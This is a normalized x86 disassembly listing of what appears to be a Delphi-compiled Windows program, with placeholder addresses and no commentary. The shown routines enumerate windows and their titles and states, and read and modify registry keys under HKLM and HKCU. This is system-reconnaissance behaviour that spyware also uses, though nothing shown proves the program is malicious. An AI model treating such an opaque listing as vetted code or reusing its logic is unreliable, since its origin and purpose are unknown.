mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46f138
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_409edc
call sub_46e9ac
xor edx edx
push ebp
push sub_46f10e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4217a0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4218e4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f115
mov eax [ ebp - 0x10 ]
call sub_421770
mov eax [ ebp - 0x10 ]
call sub_404650
retn
sub_46f148
push ebx
push esi
mov esi rw-data
xor edx edx
mov [ esi ] edx
push 0x5
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ esi ]
xor edx edx
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x2
push ebx
call __imp_GetWindow
mov ebx eax
inc [ esi ]
test ebx ebx
jne r-xdata
sub_46f17c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46f2ed
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0xff
call sub_405c6c
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetWindowTextA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov [ ebp - 0x34 ] 0x2c
lea eax [ ebp - 0x34 ]
push eax
push ebx
call GetWindowPlacement
mov eax [ ebp - 0x2c ]
cmp eax 0x3
jne r-xdata
sub esi 0x4
mov esi [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f2f4
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
cmp eax 0x8
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
mov bl 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp eax 0x4
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
push [ rw-data ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
mov eax ebx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x38 ]
call sub_409e5c
push [ ebp - 0x38 ]
push r-xdata
mov eax ebx
call sub_46f148
lea edx [ ebp - 0x3c ]
call sub_409d70
push [ ebp - 0x3c ]
push r-xdata
push r-xdata
push r-xdata
mov eax rw-data
mov edx 0xb
call sub_4058e0
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
sub_46f3b8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46f519
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0xff
call sub_405c6c
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetWindowTextA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov [ ebp - 0x34 ] 0x2c
lea eax [ ebp - 0x34 ]
push eax
push ebx
call GetWindowPlacement
mov eax [ ebp - 0x2c ]
cmp eax 0x3
jne r-xdata
sub esi 0x4
mov esi [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f520
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
push [ rw-data ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
mov eax ebx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x38 ]
call sub_409e5c
push [ ebp - 0x38 ]
push r-xdata
mov eax ebx
call sub_46f148
lea edx [ ebp - 0x3c ]
call sub_409d70
push [ ebp - 0x3c ]
push r-xdata
push r-xdata
push r-xdata
mov eax rw-data
mov edx 0xb
call sub_4058e0
mov bl 0x1
cmp eax 0x8
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
cmp eax 0x4
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
sub_46f5e4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor eax eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46f6b7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0xff
call sub_405c6c
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetWindowTextA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov [ ebp - 0x30 ] 0x2c
lea eax [ ebp - 0x30 ]
push eax
push ebx
call GetWindowPlacement
push ebx
call IsWindowVisible
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6be
lea eax [ ebp - 0x34 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov bl 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ rw-data ]
push [ ebp - 0x4 ]
push r-xdata
mov eax ebx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_409e5c
push [ ebp - 0x34 ]
push r-xdata
mov eax rw-data
mov edx 0x5
call sub_4058e0
sub_46f708
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f739
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f740
retn
mov eax rw-data
call sub_405530
sub_46f744
push ebp
mov ebp esp
mov ecx 0x16
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_46fd1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_421ea0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
call sub_421770
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx 0x80000001
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_421ea0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
mov eax ebx
call sub_421770
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx 0x80000002
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_421dd8
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
push [ ebp - 0x4 ]
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x34 ]
push r-xdata
lea ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x3c ]
mov eax ebx
call sub_422068
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x38 ]
call sub_40a68c
push [ ebp - 0x38 ]
push r-xdata
lea ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x44 ]
mov eax ebx
call sub_422068
push [ ebp - 0x44 ]
push r-xdata
push r-xdata
push r-xdata
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0xc
call sub_4058e0
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
mov eax ebx
call sub_421770
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx 0x80000002
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_421dd8
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x4c ]
push r-xdata
lea ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
mov eax ebx
call sub_422068
mov eax [ ebp - 0x54 ]
lea edx [ ebp - 0x50 ]
call sub_40a68c
push [ ebp - 0x50 ]
push r-xdata
lea ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x60 ]
lea ecx [ ebp - 0x5c ]
mov eax ebx
call sub_422068
push [ ebp - 0x5c ]
push r-xdata
push r-xdata
push r-xdata
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_4058e0
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x18 ]
call sub_404650
mov eax esi
call sub_404650
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fd26
lea eax [ ebp - 0xb0 ]
mov edx 0x20
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
mov eax ebx
call sub_421770
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x64 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x64 ]
mov cl 0x1
mov eax ebx
call sub_4218e4
mov edx esi
mov eax ebx
call sub_421ea0
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x20 ] eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x24 ] eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x28 ] eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x20 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
je r-xdata
mov eax ebx
call sub_421770
lea ecx [ ebp - 0x94 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x94 ]
lea eax [ ebp - 0x90 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x90 ]
mov cl 0x1
mov eax ebx
call sub_4218e4
mov edx esi
mov eax ebx
call sub_421ea0
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x20 ] eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x24 ] eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
je r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x6c ]
push r-xdata
lea ecx [ ebp - 0x74 ]
mov edx [ ebp - 0x24 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x74 ]
lea ecx [ ebp - 0x70 ]
mov eax ebx
call sub_422068
push [ ebp - 0x70 ]
push r-xdata
lea ecx [ ebp - 0x7c ]
mov edx [ ebp - 0x20 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x7c ]
lea ecx [ ebp - 0x78 ]
mov eax ebx
call sub_422068
push [ ebp - 0x78 ]
push r-xdata
lea ecx [ ebp - 0x84 ]
mov edx [ ebp - 0x2c ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x84 ]
lea ecx [ ebp - 0x80 ]
mov eax ebx
call sub_422068
push [ ebp - 0x80 ]
push r-xdata
lea ecx [ ebp - 0x8c ]
mov edx [ ebp - 0x28 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x8c ]
lea ecx [ ebp - 0x88 ]
mov eax ebx
call sub_422068
push [ ebp - 0x88 ]
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0xd
call sub_4058e0
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x98 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x98 ]
push r-xdata
lea ecx [ ebp - 0xa0 ]
mov edx [ ebp - 0x24 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xa0 ]
lea ecx [ ebp - 0x9c ]
mov eax ebx
call sub_422068
push [ ebp - 0x9c ]
push r-xdata
lea ecx [ ebp - 0xa8 ]
mov edx [ ebp - 0x20 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xa8 ]
lea ecx [ ebp - 0xa4 ]
mov eax ebx
call sub_422068
push [ ebp - 0xa4 ]
push r-xdata
lea ecx [ ebp - 0xb0 ]
mov edx [ ebp - 0x28 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xb0 ]
lea ecx [ ebp - 0xac ]
mov eax ebx
call sub_422068
push [ ebp - 0xac ]
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0xb
call sub_4058e0
sub_46ff10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
xor eax eax
push ebp
push sub_46ffc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov esi 0x80000002
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_421d50
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ffc9
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
mov esi 0x80000001
sub_46fff0
push ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
xor edx edx
mov eax ebx
call sub_421bd8
mov eax ebx
call sub_421770
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
xor edx edx
mov eax ebx
call sub_421bd8
mov eax ebx
call sub_421770
mov eax ebx
call sub_404650
pop ebx
retn
sub_4700d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_470164
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_47013d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x78 ]
call sub_40711c
mov eax [ ebp - 0x8 ]
not eax
cmp eax 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47016b
lea eax [ ebp - 0xc ]
call sub_40700c
retn
sub_470178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4702b1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_47028a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx r-xdata
call sub_405584
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_45eac4
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x78 ]
call sub_40711c
mov eax [ ebp - 0x8 ]
cmp eax 0xe
jg r-xdata
sub eax 0x12
je r-xdata
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x10
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x10
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4702b8
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x10
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
jmp r-xdata
sub_47037c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4703f0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405ea8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x4c ]
call sub_40711c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4703f7
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x8 ]
call sub_405d28
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4703fc
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_470664
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_405530
lea eax [ ebp - 0x1c ]
call sub_40700c
push eax
lea edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x68 ]
call sub_40711c
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
call sub_407024
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call sub_40648c
add esp 0xc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47066b
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x24 ]
call sub_40700c
lea eax [ ebp - 0x20 ]
call sub_40700c
lea eax [ ebp - 0x1c ]
call sub_40700c
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
inc ebx
xor edi edi
sub eax 0x12
je r-xdata
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub eax 0x10
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
dec eax
je r-xdata
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call sub_40648c
add esp 0xc
cmp ax 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub eax 0x10
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub eax 0x10
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub eax 0x4
je r-xdata
push edi
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_40648c
add esp 0x10
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_407024
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_40648c
add esp 0xc
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0xc ]
call sub_4057d4
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_40648c
add esp 0xc
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x10 ]
call sub_4057d4
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call sub_40648c
add esp 0xc
cmp eax 0xe
jg r-xdata
push [ esi ]
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x9
call sub_4058e0
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
jmp r-xdata
sub_470784
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4708b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_40700c
push eax
lea edx [ ebp - 0x14 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x68 ]
call sub_40711c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_407024
lea eax [ ebp - 0x18 ]
call sub_40700c
push eax
lea eax [ ebp - 0x1c ]
call sub_405d28
push eax
lea edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x90 ]
call sub_40711c
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_405ea8
mov eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
call sub_40711c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
call sub_407024
mov eax [ ebp - 0xc ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call sub_40648c
add esp 0x10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4708c0
lea eax [ ebp - 0x28 ]
call sub_40700c
lea eax [ ebp - 0x24 ]
call sub_405d28
lea eax [ ebp - 0x20 ]
call sub_40700c
lea eax [ ebp - 0x1c ]
call sub_405d28
lea eax [ ebp - 0x18 ]
call sub_40700c
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
call sub_40700c
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4708d0
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_470a03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_40700c
push eax
lea edx [ ebp - 0x14 ]
